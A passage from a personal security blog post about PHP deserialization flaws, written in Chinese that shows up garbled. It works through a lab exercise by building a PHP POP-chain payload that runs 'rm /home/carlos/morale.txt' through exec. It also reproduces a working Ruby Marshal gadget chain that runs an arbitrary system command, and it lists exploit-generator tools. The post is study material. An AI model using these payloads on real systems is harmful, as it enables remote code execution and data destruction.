<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$default_desc_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$desc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$product</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$desc_type</span>=<span class="string">&#x27;HTML_DESC&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desc = <span class="keyword">new</span> <span class="title class_">Description</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;default_desc_type = <span class="variable">$desc_type</span>;</span><br><span class="line">        <span class="comment">// Carlos thought this is cool, having a function called in two places... What a genius</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">build_product</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;default_desc_type&quot;</span>, <span class="string">&quot;desc&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">build_product</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">build_product</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;product = <span class="keyword">new</span> <span class="title class_">Product</span>(<span class="variable language_">$this</span>-&gt;default_desc_type, <span class="variable language_">$this</span>-&gt;desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default_desc_type</span>, <span class="variable">$desc</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desc = <span class="variable">$desc</span>-&gt;<span class="variable">$default_desc_type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Description</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HTML_DESC</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$TEXT_DESC</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// @Carlos, what were you thinking with these descriptions? Please refactor!</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;HTML_DESC = <span class="string">&#x27;&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;TEXT_DESC = <span class="string">&#x27;This product is cool in text&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆï¼Œé€™å€‹ç¶²ç«™çš„cookieæ˜¯æœƒç¶“éphpååºåˆ—çš„ï¼Œæ‰€ä»¥å…ˆå»å°‹æ‰¾<code>__wakeup</code>çš„magicå‡ºç¾åœ¨å“ª?  </p>
<p>ç­”æ¡ˆå°±æ˜¯<code>CustomTemplate</code>ï¼Œç„¶å¾Œ<code>__wakeup</code>æœƒå»è§¸ç™¼å®ƒè£¡é¢çš„<code>build_product()</code>å‡½æ•¸ï¼š  </p>
<p>å†ä¾†è§€å¯Ÿå“ªå€‹classå¸¶æœ‰å¼±é»ï¼Œæœƒç™¼ç¾<code>DefaultMap</code>çš„<code>__get</code>magicæœ‰å€‹<code>call_user_func($this-&gt;callback, $name);</code>çš„æ®µè½ï¼Œè€Œ<code>call_user_func</code>é€™å€‹å‡½æ•¸åœ¨phpè£¡é¢å¯ä»¥ä»¥å­—ä¸²çš„æ–¹å¼å»å‘¼å«å‡½æ•¸&#x2F;åƒæ•¸ã€‚  </p>
<p>å®˜æ–¹ç¶²ç«™è§£é‡‹ï¼š<a target="_blank" rel="noopener" href="https://php.golaravel.com/function.call-user-func.html">https://php.golaravel.com/function.call-user-func.html</a>  </p>
<p>è€Œé€™é¡Œçš„ç›®æ¨™æ˜¯åŸ·è¡Œ<code>rm /home/carlos/morale.txt</code>ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ï¼š   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;rm /home/carlos/morale.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>é”æˆç›®æ¨™ã€‚<br>ä»”ç´°è§€å¯Ÿ<code>DefaultMap</code>çš„æ®µè½ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå¸Œæœ›åŸ·è¡Œ<code>call_user_func(&#39;exec&#39;, &#39;rm /home/carlos/morale.txt&#39;);</code>ï¼Œæœ‰å…©é»ï¼š<br>1.å¿…é ˆèƒ½å‘¼å«åˆ°<code>__get</code>ï¼Œä¹Ÿå°±æ˜¯æœ‰äººå»å­˜å–é‚£å€‹ç‰©ä»¶çš„<code>callback</code> attribute<br>2.å¿…é ˆä½¿<code>name</code>&#x3D;<code>&#39;rm /home/carlos/morale.txt&#39;</code>è€Œä¸”é‚£å€‹<code>DefaultMap</code>ç‰©ä»¶çš„<code>callback</code>ç•¶ä¸‹ç­‰æ–¼<code>&#39;exec&#39;</code>ã€‚<br>å†å›å»è§€å¯Ÿä¸€æ¬¡<code>CustomTemplate</code>çš„<code>build_product()</code>å‡½æ•¸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">build_product</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;product = <span class="keyword">new</span> <span class="title class_">Product</span>(<span class="variable language_">$this</span>-&gt;default_desc_type, <span class="variable language_">$this</span>-&gt;desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç™¼ç¾å®ƒæœƒå»ºç«‹ä¸€å€‹<code>Product</code>ç‰©ä»¶ï¼Œå»çœ‹çœ‹<code>Product</code>çš„å…§å®¹ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default_desc_type</span>, <span class="variable">$desc</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desc = <span class="variable">$desc</span>-&gt;<span class="variable">$default_desc_type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæŠŠ<code>desc</code>è®Šæˆ<code>DefaultMap</code>ç‰©ä»¶ï¼Œé‚£å°±å¯ä»¥é€é<code>__construct</code>å»å‘¼å«<code>DefaultMap</code>çš„<code>&#39;rm /home/carlos/morale.txt&#39;</code>attribute(ç•¶ç„¶ï¼Œå®ƒä¸å­˜åœ¨ï¼Œä½†å‰é¢èªªéä¸å­˜åœ¨çš„ä¹Ÿæœƒé€šé<code>__get</code>)ï¼Œæœ€å¾Œå†æŠŠ<code>DefaultMap</code>çš„<code>callback</code>é è¨­æˆ<code>&#39;exec&#39;</code>å°±å¯ä»¥å®Œæˆå‰›å‰›çš„RCEè¦åŠƒäº†!<br><strong>FINAL PAYLOAD:</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$default_desc_type</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>=<span class="string">&quot;exec&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">new</span> <span class="title class_">CustomTemplate</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;default_desc_type=<span class="string">&quot;rm /home/carlos/morale.txt&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span>-&gt;desc=<span class="keyword">new</span> <span class="title class_">DefaultMap</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>)));</span><br></pre></td></tr></table></figure>
<p>æˆ‘é‚„æœ‰çœ‹åˆ°ä¸€å€‹ä¸éŒ¯çš„ç¯„ä¾‹åœ¨ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120297881">https://blog.csdn.net/cosmoslin/article/details/120297881</a>  </p>
<h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>åœ¨phpä¸­æœ‰è¨±å¤šå¥‡å¥‡æ€ªæ€ªçš„å”è­°ï¼Œåƒæ˜¯LFIæ™‚å¯ä»¥åˆ©ç”¨çš„<code>php://</code>å”è­°ï¼Œè€Œåœ¨phpä¸­<code>phar://</code>çš„å”è­°å¯ä»¥æŠŠé‚£å€‹æª”æ¡ˆç•¶ä½œphp pharçš„ç‰©ä»¶ååºåˆ—åŒ–ä¸€æ¬¡ã€‚<br>Github Repoï¼š<a target="_blank" rel="noopener" href="https://github.com/kunte0/phar-jpg-polyglot/tree/master">https://github.com/kunte0/phar-jpg-polyglot/tree/master</a>  </p>
<h2 id="åŒå ´åŠ æ˜ "><a href="#åŒå ´åŠ æ˜ " class="headerlink" title="åŒå ´åŠ æ˜ "></a>åŒå ´åŠ æ˜ </h2><p>ä¸åªphpæœ‰ååºåˆ—åŒ–çš„æ´ï¼Œè€Œå› ç‚ºé€™äº›å¥—ä»¶ç¾åœ¨éƒ½æ˜¯äº’ç›¸ç”¨ä¾†ç”¨å»çš„æ‰€ä»¥å…¶å¯¦æœ‰å¾ˆå¤šåˆ¥äººæ•´ç†å¥½çš„gadget  </p>
<h3 id="phpgcc"><a href="#phpgcc" class="headerlink" title="phpgcc"></a>phpgcc</h3><p>æ‰“ç¾å­˜çš„phpå¥—ä»¶çš„POP CHAINç”Ÿæˆå·¥å…·  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>  </p>
<h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>JAVA ç¾å­˜ååºåˆ—åŒ–æ”»æ“ŠPAYLOADå€‘<br><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>P.S. KALI LINUXä¸Šé¢çš„debugæ–¹å¼<br>èª¿å›å»java11ï¼Œå‰é¢æ¥ä¸Šï¼š  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<p>å¾Œé¢å†æ‰“<code>jar ......</code><br>ç–‘ä¼¼<strong>CommonsCollections</strong>é‚£ä¸€ç³»åˆ—æ¯”è¼ƒå®¹æ˜“é(?)  </p>
<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>æŠŠ<code>rs.instance_variable_set(&#39;@git_set&#39;, &quot;id&quot;)</code>é‚£è¡Œç¬¬äºŒå€‹åƒæ•¸çš„idæ›æˆæƒ³è¦çš„command<br>ç„¶å¾Œä¸Ÿå»<a target="_blank" rel="noopener" href="https://www.onlinegdb.com/online_ruby_compiler">onlinegdb</a>è·‘<br>ä¾†æºï¼š<a target="_blank" rel="noopener" href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a><br>å¥½åƒ2.X~3.Xéƒ½èƒ½æ‰“ï¼ŒæŒºè¬èƒ½çš„(?  </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Autoload the required classes</span></span><br><span class="line"><span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:SpecFetcher</span></span><br><span class="line"><span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Installer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prevent the payload from running when we Marshal.dump it</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Gem</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Requirement</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">marshal_dump</span></span><br><span class="line">      [<span class="variable">@requirements</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">wa1 = <span class="title class_">Net::WriteAdapter</span>.new(<span class="title class_">Kernel</span>, <span class="symbol">:system</span>)</span><br><span class="line"></span><br><span class="line">rs = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:RequestSet</span>.allocate</span><br><span class="line">rs.instance_variable_set(<span class="string">&#x27;@sets&#x27;</span>, wa1)</span><br><span class="line">rs.instance_variable_set(<span class="string">&#x27;@git_set&#x27;</span>, <span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">wa2 = <span class="title class_">Net::WriteAdapter</span>.new(rs, <span class="symbol">:resolve</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Package</span><span class="symbol">:</span><span class="symbol">:TarReader</span><span class="symbol">:</span><span class="symbol">:Entry</span>.allocate</span><br><span class="line">i.instance_variable_set(<span class="string">&#x27;@read&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">i.instance_variable_set(<span class="string">&#x27;@header&#x27;</span>, <span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="title class_">Net</span><span class="symbol">:</span><span class="symbol">:BufferedIO</span>.allocate</span><br><span class="line">n.instance_variable_set(<span class="string">&#x27;@io&#x27;</span>, i)</span><br><span class="line">n.instance_variable_set(<span class="string">&#x27;@debug_output&#x27;</span>, wa2)</span><br><span class="line"></span><br><span class="line">t = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Package</span><span class="symbol">:</span><span class="symbol">:TarReader</span>.allocate</span><br><span class="line">t.instance_variable_set(<span class="string">&#x27;@io&#x27;</span>, n)</span><br><span class="line"></span><br><span class="line">r = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Requirement</span>.allocate</span><br><span class="line">r.instance_variable_set(<span class="string">&#x27;@requirements&#x27;</span>, t)</span><br><span class="line"></span><br><span class="line">payload = <span class="title class_">Marshal</span>.dump([<span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:SpecFetcher</span>, <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Installer</span>, r])</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;base64&quot;</span></span><br><span class="line">puts <span class="title class_">Base64</span>.encode64(payload)</span><br></pre></td></tr></table></figure>
<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>ä»Šå¤©å¥½ç´¯ï¼Œæˆ‘æ”¹å¤©æœƒå»çœ‹é˜²è­·å’Œç¹éé˜²è­·çš„æ–¹æ³•orz<br>æˆ‘é‚„è¦å¤šç·´ç¿’&gt;&lt;</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-class"><span class="toc-number">2.</span> <span class="toc-text">php class</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic-Methods"><span class="toc-number">3.</span> <span class="toc-text">Magic Methods</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">3.1.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">3.2.</span> <span class="toc-text">__get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-number">3.3.</span> <span class="toc-text">__set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">3.4.</span> <span class="toc-text">__invoke</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">3.5.</span> <span class="toc-text">__toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">3.6.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-number">3.7.</span> <span class="toc-text">__sleep</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Serialization-Unserialization"><span class="toc-number">4.</span> <span class="toc-text">Serialization&#x2F;Unserialization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP-Chain"><span class="toc-number">5.</span> <span class="toc-text">POP Chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-number">6.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E5%A0%B4%E5%8A%A0%E6%98%A0"><span class="toc-number">7.</span> <span class="toc-text">åŒå ´åŠ æ˜ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpgcc"><span class="toc-number">7.1.</span> <span class="toc-text">phpgcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial"><span class="toc-number">7.2.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">7.3.</span> <span class="toc-text">Ruby</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">8.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/04/03/php-serial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/04/03/php-serial/&text=PHP Serialization Vulns Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/04/03/php-serial/&is_video=false&description=PHP Serialization Vulns Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHP Serialization Vulns Note&body=Check out this article: http://wha13.github.io/2024/04/03/php-serial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/04/03/php-serial/&name=PHP Serialization Vulns Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/04/03/php-serial/&t=PHP Serialization Vulns Note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
